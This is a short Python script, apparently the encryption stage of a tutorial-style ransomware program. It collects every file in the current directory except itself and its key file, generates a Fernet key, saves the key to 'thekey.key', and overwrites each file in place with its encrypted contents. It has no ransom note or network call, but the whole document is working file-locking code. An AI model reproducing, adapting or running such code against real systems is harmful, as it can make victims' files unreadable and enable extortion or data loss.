import os
from cryptography.fernet import Fernet

files = []
for file in os.listdir():
    if file == "encrypt.py" or file == 'thekey.key':
        continue
    if os.path.isfile(file):  # Corrected this line
        files.append(file)
print(files)

key = Fernet.generate_key()

with open('thekey.key', 'wb') as thekey:
    thekey.write(key)
for file in files:
    with open(file, 'rb') as thefile:
        content = thefile.read()
    contents_encrypted = Fernet(key).encrypt(content)
    with open(file, 'wb') as thefile:  # Corrected this line
        thefile.write(contents_encrypted)  # Corrected this line

